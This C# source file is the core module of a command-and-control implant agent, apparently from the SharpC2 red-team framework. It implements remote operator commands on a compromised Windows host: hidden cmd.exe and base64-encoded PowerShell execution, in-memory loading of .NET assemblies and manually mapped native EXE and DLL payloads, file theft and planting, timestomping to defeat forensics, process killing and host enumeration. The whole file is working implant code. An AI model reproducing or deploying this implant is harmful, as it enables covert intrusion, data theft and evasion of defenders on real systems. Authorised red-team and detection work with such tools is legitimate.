using AgentCore.Controllers;
using AgentCore.Execution.DynamicInvoke;
using AgentCore.Execution.ManualMap;
using AgentCore.Interfaces;
using AgentCore.Models;

using Common.Models;

using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;

namespace AgentCore.Modules
{
    public class CoreAgentModule : IAgentModule
    {
        private AgentController Agent { get; set; }
        private ConfigController Config { get; set; }

        public void Init(AgentController agentController, ConfigController configController)
        {
            Agent = agentController;
            Config = configController;
        }

        public AgentModule GetModuleInfo()
        {
            return new AgentModule
            {
                Name = "core",
                Description = "Provides core agent functionality",
                Developers = new List<Developer>
                {
                    new Developer { Name = "Daniel Duggan", Handle = "@_RastaMouse" },
                    new Developer { Name = "Adam Chester", Handle = "@_xpn_" }
                },
                Commands = new List<AgentCommand>
                {
                    new AgentCommand
                    {
                        Name = "sleep",
                        Description = "Set the sleep interval (seconds) and jitter (percent)",
                        HelpText = "sleep [interval] [jitter]",
                        CallBack = SetSleep
                    },
                    new AgentCommand
                    {
                        Name = "load-module",
                        Description = "Load an external agent module into the current agent",
                        HelpText = "load-module [path]",
                        CallBack = LoadAgentModule
                    },
                    new AgentCommand
                    {
                        Name = "link",
                        Description = "Link to a TCP agent",
                        HelpText = "link [target] [port]",
                        CallBack = LinkTcpAgent
                    },
                    new AgentCommand
                    {
                        Name = "unlink",
                        Description = "Unlink a TCP agent",
                        HelpText = "unlink [target]",
                        CallBack = UnlinkTcpAgent
                    },
                    new AgentCommand
                    {
                        Name = "exit",
                        Description = "Kill the current agent.",
                        HelpText = "exit",
                        CallBack = ExitAgent
                    },
                    new AgentCommand
                    {
                        Name = "nop",
                        Visible = false,
                        CallBack = NOP
                    },
                    new AgentCommand
                    {
                        Name = "pwd",
                        Description = "Prints the current working directory.",
                        HelpText = "pwd",
                        CallBack = PrintWorkingDirectory
                    },
                    new AgentCommand
                    {
                        Name = "cd",
                        Description = "Change directory",
                        HelpText = "cd [path]",
                        CallBack = ChangeDirectory
                    },
                    new AgentCommand
                    {
                        Name = "ls",
                        Description = "List directory",
                        HelpText = "ls [path]",
                        CallBack = ListDirectory
                    },
                    new AgentCommand
                    {
                        Name = "cp",
                        Description = "Copy a file",
                        HelpText = "cp [source] [destination]",
                        CallBack = CopyFile
                    },
                    new AgentCommand
                    {
                        Name = "mv",
                        Description = "Move a file",
                        HelpText = "mv [source] [destination]",
                        CallBack = MoveFile
                    },
                    new AgentCommand
                    {
                        Name =  "rm",
                        Description = "Delete a file",
                        HelpText = "rm [path]",
                        CallBack = RemoveFile
                    },
                    new AgentCommand
                    {
                        Name = "rmdir",
                        Description = "Delete a directory",
                        HelpText = "rmdir [path]",
                        CallBack = RemoveDirectory
                    },
                    new AgentCommand
                    {
                        Name = "mkdir",
                        Description = "Create a directory",
                        HelpText = "mkdir [path]",
                        CallBack = CreateDirectory
                    },
                    new AgentCommand
                    {
                        Name = "cat",
                        Description = "Read the (string) content of a file",
                        HelpText = "cat [path]",
                        CallBack = ReadFile
                    },
                    new AgentCommand
                    {
                        Name = "download",
                        Description = "Download a file",
                        HelpText = "download [path]",
                        CallBack = DownloadFile
                    },
                    new AgentCommand
                    {
                        Name = "upload",
                        Description = "Upload a file",
                        HelpText = "upload [source] [destination]",
                        CallBack = UploadFile
                    },
                    new AgentCommand
                    {
                        Name = "drives",
                        Description = "Get current drives",
                        HelpText = "drives",
                        CallBack = GetDrives
                    },
                    new AgentCommand
                    {
                        Name = "search",
                        Description = "Search filesystem recursively for a filename pattern",
                        HelpText = "search [directory] [pattern]",
                        CallBack = SearchForFile
                    },
                    new AgentCommand
                    {
                        Name = "timestomp",
                        Description = "Copy timestamp information from one file to another",
                        HelpText = "timestomp [source] [target]",
                        CallBack = ChangeFileTimestamp
                    },
                    new AgentCommand
                    {
                        Name = "getenv",
                        Description = "Get all environment variables",
                        HelpText = "getenv",
                        CallBack = GetEnvironmentVariables
                    },
                    new AgentCommand
                    {
                        Name = "setenv",
                        Description = "Set an environment variable",
                        HelpText = "setenv [key] [value]",
                        CallBack = SetEnvironmentValue
                    },
                    new AgentCommand
                    {
                        Name = "ps",
                        Description = "Get running processes",
                        HelpText = "ps",
                        CallBack = GetRunningProcesses
                    },
                    new AgentCommand
                    {
                        Name = "kill",
                        Description = "Kill a process",
                        HelpText = "kill [pid]",
                        CallBack = KillProcess
                    },
                    new AgentCommand
                    {
                        Name = "getuid",
                        Description = "Get current identity",
                        HelpText = "getuid",
                        CallBack = GetUserIdentity
                    },
                    new AgentCommand
                    {
                        Name = "shell",
                        Description = "Execute a command via cmd.exe",
                        HelpText = "shell [command] [args]",
                        CallBack = ExecuteShellCommand
                    },
                    new AgentCommand
                    {
                        Name = "run",
                        Description = "Execute a command",
                        HelpText = "run [command] [args]",
                        CallBack = ExecuteCommand
                    },
                    new AgentCommand
                    {
                        Name = "powershell",
                        Description = "Execute a PowerShell command via powershell.exe",
                        HelpText = "powershell [cmdlet] [args]",
                        CallBack = ExecutePowerShell
                    },
                    new AgentCommand
                    {
                        Name = "execute-assembly",
                        Description = "Execute a .NET assembly",
                        HelpText = "execute-assembly [path]",
                        CallBack = ExecuteAssembly
                    },
                    new AgentCommand
                    {
                        Name = "ifconfig",
                        Description = "Get network interface information",
                        HelpText = "ifconfig",
                        CallBack = GetInterfaceInfo
                    },
                    new AgentCommand
                    {
                        Name = "resolve",
                        Description = "Resolve a hostname",
                        HelpText = "resolve",
                        CallBack = ResolveHostname
                    },
                    new AgentCommand
                    {
                        Name = "execute-exe",
                        Description = "Map a native EXE into memory and call its entry point",
                        HelpText = "execute-exe [path]",
                        CallBack = ExecuteNativeExe
                    },
                    new AgentCommand
                    {
                        Name = "execute-dll",
                        Description = "Map a native DLL into memory and call the specified exported function",
                        HelpText = "execute-dll [path] [exported function] [args]",
                        CallBack = ExecuteNativeDll
                    }
                }
            };
        }

        private void ExecuteNativeDll(byte[] data)
        {
            try
            {
                var split = Encoding.UTF8.GetString(data).Split(' ');
                var bytes = Convert.FromBase64String(split[0]);
                var exported = split[1];

                var args = new List<string>();

                for (int i = 2; i < split.Length; i++)
                {
                    args.Add(split.ElementAt(i));
                }

                var parameters = new object[] { string.Join(" ", args.ToArray()) };
                var pe = Overload.OverloadModule(bytes);
                var output = default(string);
                var t = new Thread(() =>
                {
                    output = (string) Generic.CallMappedDLLModuleExport(pe.PEINFO, pe.ModuleBase, exported, typeof(DllExport), parameters);
                });

                t.Start();
                t.Join();

                if (output != default)
                {
                    Agent.SendOutput(output);
                }
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void ExecuteNativeExe(byte[] data)
        {
            var stdout = Console.Out;
            var stderr = Console.Error;

            try
            {
                var outWrite = new StringWriter();
                var errWrite = new StringWriter();

                Console.SetOut(outWrite);
                Console.SetError(errWrite);

                var bytes = Convert.FromBase64String(Encoding.UTF8.GetString(data));
                var map = Map.MapModuleToMemory(bytes);
                Generic.CallMappedPEModule(map.PEINFO, map.ModuleBase);

                Console.Out.Flush();
                Console.Error.Flush();

                var result = new StringBuilder();
                result.Append(outWrite.ToString());
                result.Append(errWrite.ToString());

                Agent.SendOutput(result.ToString());
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
            finally
            {
                Console.SetOut(stdout);
                Console.SetError(stderr);
            }
        }

        private void LinkTcpAgent(byte[] data)
        {
            var split = Encoding.UTF8.GetString(data).Split(' ');

            var tcpClient = new TcpClientModule(split[0], Convert.ToInt32(split[1]));
            tcpClient.Init(Config, Agent.Crypto);
            tcpClient.Start();

            Agent.TcpClients.Add(tcpClient);

            var message = new AgentMessage
            {
                IdempotencyKey = Guid.NewGuid().ToString(),
                Metadata = new AgentMetadata(),
                Data = new C2Data { Module = "link", Command = "link", Data = Encoding.UTF8.GetBytes((Config.GetOption(ConfigSetting.Metadata) as AgentMetadata).AgentID) }
            };

            tcpClient.SendData(message);
        }

        private void UnlinkTcpAgent(byte[] data)
        {
            var host = Encoding.UTF8.GetString(data);
            var tcpClient = Agent.TcpClients.FirstOrDefault(c => c.Hostname.Equals(host, StringComparison.OrdinalIgnoreCase));

            if (tcpClient != null)
            {
                tcpClient.Stop();
                Agent.TcpClients.Remove(tcpClient);
            }
            else
            {
                Agent.SendError("TCP agent not found");
            }
        }

        private void ExitAgent(byte[] data)
        {
            Agent.AgentStatus = AgentStatus.Stopped;
        }

        private void LoadAgentModule(byte[] data)
        {
            try
            {
                var assembly = Assembly.Load(Convert.FromBase64String(Encoding.UTF8.GetString(data)));
                var module = assembly.CreateInstance("Agent.Module", true);

                if (module is IAgentModule == false)
                {
                    Agent.SendError("Assembly does not implement IAgentModule");
                    return;
                }

                var agentModule = module as IAgentModule;
                Agent.RegisterAgentModule(agentModule);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void SetSleep(byte[] data)
        {
            try
            {
                var split = Encoding.UTF8.GetString(data).Split(' ');

                if (split.Length >= 1 && !string.IsNullOrEmpty(split[0]))
                {
                    Config.SetOption(ConfigSetting.SleepInterval, split[0]);
                }

                if (split.Length >= 2 && !string.IsNullOrEmpty(split[1]))
                {
                    Config.SetOption(ConfigSetting.SleepJitter, split[1]);
                }
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void NOP(byte[] data)
        {
            // nothing
        }

        private void ChangeFileTimestamp(byte[] data)
        {
            try
            {
                var timestomp = Encoding.UTF8.GetString(data).Split(' ');
                var source = new FileInfo(timestomp[0]);

                File.SetCreationTime(timestomp[1], source.CreationTime);
                File.SetCreationTimeUtc(timestomp[1], source.CreationTimeUtc);

                File.SetLastWriteTime(timestomp[1], source.LastWriteTime);
                File.SetLastWriteTimeUtc(timestomp[1], source.LastWriteTimeUtc);

                File.SetLastAccessTime(timestomp[1], source.LastAccessTime);
                File.SetLastAccessTimeUtc(timestomp[1], source.LastAccessTimeUtc);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void SearchForFile(byte[] data)
        {
            try
            {
                var search = Encoding.UTF8.GetString(data).Split(' ');
                var files = Directory.GetFiles(search[0], search[1], SearchOption.AllDirectories);
                var result = string.Join("\n", files);
                Agent.SendOutput(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void GetDrives(byte[] data)
        {
            try
            {
                var result = new SharpC2ResultList<DriveInfoResult>();
                var drives = DriveInfo.GetDrives();
                foreach (var drive in drives)
                {
                    var info = new DriveInfoResult
                    {
                        Name = drive.Name,
                        Type = drive.DriveType
                    };

                    if (drive.IsReady)
                    {
                        info.Label = drive.VolumeLabel;
                        info.Format = drive.DriveFormat;
                        info.Capacity = ConvertFileLength(drive.TotalSize);
                        info.FreeSpace = ConvertFileLength(drive.AvailableFreeSpace);
                    }

                    result.Add(info);
                }

                Agent.SendOutput(result.ToString());
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void ListDirectory(byte[] data)
        {
            try
            {
                var path = data.Length < 1 ? Directory.GetCurrentDirectory() : Encoding.UTF8.GetString(data);
                var result = new SharpC2ResultList<FileSystemEntryResult>();

                foreach (var directory in Directory.GetDirectories(path))
                {
                    var info = new DirectoryInfo(directory);
                    result.Add(new FileSystemEntryResult
                    {
                        Size = string.Empty,
                        Type = "dir",
                        LastModified = info.LastWriteTimeUtc,
                        Name = info.Name
                    });
                }

                foreach (var file in Directory.GetFiles(path))
                {
                    var info = new FileInfo(file);
                    result.Add(new FileSystemEntryResult
                    {
                        Size = ConvertFileLength(info.Length),
                        Type = "fil",
                        LastModified = info.LastWriteTimeUtc,
                        Name = info.Name
                    });
                }

                Agent.SendOutput(result.ToString());
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void UploadFile(byte[] data)
        {
            try
            {
                var file = Encoding.UTF8.GetString(data).Split(' ');
                File.WriteAllBytes(file[1], Convert.FromBase64String(file[0]));
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void DownloadFile(byte[] data)
        {
            try
            {
                var path = Encoding.UTF8.GetString(data);
                var file = Convert.ToBase64String(File.ReadAllBytes(path));
                Agent.SendOutput(file);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void ReadFile(byte[] data)
        {
            try
            {
                var text = File.ReadAllText(Encoding.UTF8.GetString(data));
                Agent.SendOutput(text);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void CreateDirectory(byte[] data)
        {
            try
            {
                Directory.CreateDirectory(Encoding.UTF8.GetString(data));
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void RemoveDirectory(byte[] data)
        {
            try
            {
                var directory = Encoding.UTF8.GetString(data);
                Directory.Delete(directory, true);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void RemoveFile(byte[] data)
        {
            try
            {
                File.Delete(Encoding.UTF8.GetString(data));
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void MoveFile(byte[] data)
        {
            try
            {
                var file = Encoding.UTF8.GetString(data).Split(' ');
                File.Move(file[0], file[1]);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void CopyFile(byte[] data)
        {
            try
            {
                var file = Encoding.UTF8.GetString(data).Split(' ');
                File.Copy(file[0], file[1], true);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void ChangeDirectory(byte[] data)
        {
            try
            {
                var path = Encoding.UTF8.GetString(data);
                Directory.SetCurrentDirectory(path);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void PrintWorkingDirectory(byte[] data)
        {
            try
            {
                var result = Directory.GetCurrentDirectory();
                Agent.SendOutput(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private string ConvertFileLength(long size)
        {
            var result = size.ToString();

            if (size < 1024) { result = $"{size}b"; }
            else if (size > 1024 && size <= 1048576) { result = $"{size / 1024}kb"; }
            else if (size > 1048576 && size <= 1073741824) { result = $"{size / 1048576}mb"; }
            else if (size > 1073741824 && size <= 1099511627776) { result = $"{size / 1073741824}gb"; }
            else if (size > 1099511627776) { result = $"{size / 1099511627776}tb"; }

            return result;
        }

        private void ExecuteAssembly(byte[] data)
        {
            var stdout = Console.Out;
            var stderr = Console.Error;

            try
            {
                var arguments = Encoding.UTF8.GetString(data).Split(' ');
                var asmBytes = Convert.FromBase64String(arguments[0]);

                var x = string.Join(" ", arguments);
                var y = x.Replace(arguments[0], string.Empty);
                var t = y.Trim();
                var z = t.Split(' ');

                var outWrite = new StringWriter();
                var errWrite = new StringWriter();

                Console.SetOut(outWrite);
                Console.SetError(errWrite);

                var asm = Assembly.Load(asmBytes);
                asm.EntryPoint.Invoke(null, new object[] { z });

                Console.Out.Flush();
                Console.Error.Flush();

                var result = new StringBuilder();
                result.Append(outWrite.ToString());
                result.Append(errWrite.ToString());

                Agent.SendOutput(result.ToString());
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
            finally
            {
                Console.SetOut(stdout);
                Console.SetError(stderr);
            }
        }

        private void ExecutePowerShell(byte[] data)
        {
            try
            {
                var arguments = Encoding.UTF8.GetString(data).Split(' ');
                var args = string.Format("{0} {1}", arguments[0], string.Join(" ", arguments).Replace(arguments[0], ""));
                var enc = Convert.ToBase64String(Encoding.Unicode.GetBytes(args.ToString()));

                var si = new ProcessStartInfo
                {
                    FileName = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    Arguments = string.Format("-enc {0}", enc),
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false,
                    RedirectStandardError = true,
                    RedirectStandardOutput = true
                };

                var cmd = new Process { StartInfo = si };
                cmd.Start();

                var stdout = cmd.StandardOutput.ReadToEnd();
                var stderr = cmd.StandardError.ReadToEnd();

                var result = new StringBuilder();
                result.Append(stdout);
                result.Append(stderr);

                Agent.SendOutput(result.ToString());
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void ExecuteCommand(byte[] data)
        {
            try
            {
                var arguments = Encoding.UTF8.GetString(data).Split(' ');

                var si = new ProcessStartInfo
                {
                    FileName = arguments[0],
                    Arguments = string.Join(" ", arguments).Replace(arguments[0], ""),
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false,
                    RedirectStandardError = true,
                    RedirectStandardOutput = true
                };

                var cmd = new Process { StartInfo = si };
                cmd.Start();

                var stdout = cmd.StandardOutput.ReadToEnd();
                var stderr = cmd.StandardError.ReadToEnd();

                var result = new StringBuilder();
                result.Append(stdout);
                result.Append(stderr);

                Agent.SendOutput(result.ToString());
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void ExecuteShellCommand(byte[] data)
        {
            try
            {
                var arguments = Encoding.UTF8.GetString(data).Split(' ');
                var args = string.Format("{0} {1}", arguments[0], string.Join(" ", arguments).Replace(arguments[0], ""));

                var si = new ProcessStartInfo
                {
                    FileName = @"C:\Windows\System32\cmd.exe",
                    Arguments = string.Format("/c {0}", args),
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false,
                    RedirectStandardError = true,
                    RedirectStandardOutput = true
                };

                var cmd = new Process { StartInfo = si };
                cmd.Start();

                var stdout = cmd.StandardOutput.ReadToEnd();
                var stderr = cmd.StandardError.ReadToEnd();

                var result = new StringBuilder();
                result.Append(stdout);
                result.Append(stderr);

                Agent.SendOutput(result.ToString());
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void GetUserIdentity(byte[] data)
        {
            try
            {
                var identity = WindowsIdentity.GetCurrent();
                Agent.SendOutput(identity.Name);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void KillProcess(byte[] data)
        {
            try
            {
                var pid = int.Parse(Encoding.UTF8.GetString(data));
                var process = Process.GetProcessById(pid);
                process.Kill();
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void GetRunningProcesses(byte[] data)
        {
            try
            {
                var result = new SharpC2ResultList<ProcessListResult>();
                var processes = Process.GetProcesses().OrderBy(p => p.Id);
                foreach (var process in processes)
                {
                    result.Add(new ProcessListResult
                    {
                        PID = process.Id,
                        Name = process.ProcessName,
                        Session = process.SessionId
                    });
                }

                Agent.SendOutput(result.ToString());
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void SetEnvironmentValue(byte[] data)
        {
            try
            {
                var arguments = Encoding.UTF8.GetString(data).Split(' ');
                Environment.SetEnvironmentVariable(arguments[0], arguments[1]);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void GetEnvironmentVariables(byte[] data)
        {
            try
            {
                var result = new SharpC2ResultList<EnvironmentVariableResult>();
                var variables = Environment.GetEnvironmentVariables();

                foreach (DictionaryEntry env in variables)
                {
                    result.Add(new EnvironmentVariableResult
                    {
                        Key = env.Key as string,
                        Value = env.Value as string
                    });
                }

                Agent.SendOutput(result.ToString());
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void GetInterfaceInfo(byte[] data)
        {
            try
            {
                var result = new SharpC2ResultList<NetworkInterfaceResult>();
                var interfaces = NetworkInterface.GetAllNetworkInterfaces();
                foreach (var nic in interfaces)
                {
                    var properties = nic.GetIPProperties();
                    var gateways = properties.GatewayAddresses.Select(g => g.Address.ToString());

                    var uniAddresses = new List<string>();
                    var dnsServers = new List<string>();
                    var dhcpServers = new List<string>();

                    foreach (var addr in properties.UnicastAddresses.ToArray())
                    {
                        uniAddresses.Add(addr.Address.ToString());
                    }

                    foreach (var addr in properties.DnsAddresses.ToArray())
                    {
                        dnsServers.Add(addr.ToString());
                    }

                    foreach (var addr in properties.DhcpServerAddresses)
                    {
                        dhcpServers.Add(addr.ToString());
                    }

                    result.Add(new NetworkInterfaceResult
                    {
                        Name = nic.Name,
                        Unicast = string.Join(",", uniAddresses),
                        MAC = nic.GetPhysicalAddress(),
                        Gateways = string.Join(",", gateways),
                        DNS = string.Join(",", dnsServers),
                        DHCP = string.Join(",", dhcpServers)
                    });
                }

                Agent.SendOutput(result.ToString());
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void ResolveHostname(byte[] data)
        {
            try
            {
                var hostname = Encoding.UTF8.GetString(data);
                var hostEntry = Dns.GetHostEntry(hostname);
                var addresses = hostEntry.AddressList;

                var result = new StringBuilder();

                foreach (var address in addresses)
                {
                    result.Append(address.ToString() + "\n");
                }

                Agent.SendOutput(result.ToString());
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        // delegates

        [UnmanagedFunctionPointer(CallingConvention.Cdecl, CharSet = CharSet.Unicode)]
        private delegate string DllExport(string input);
    }
}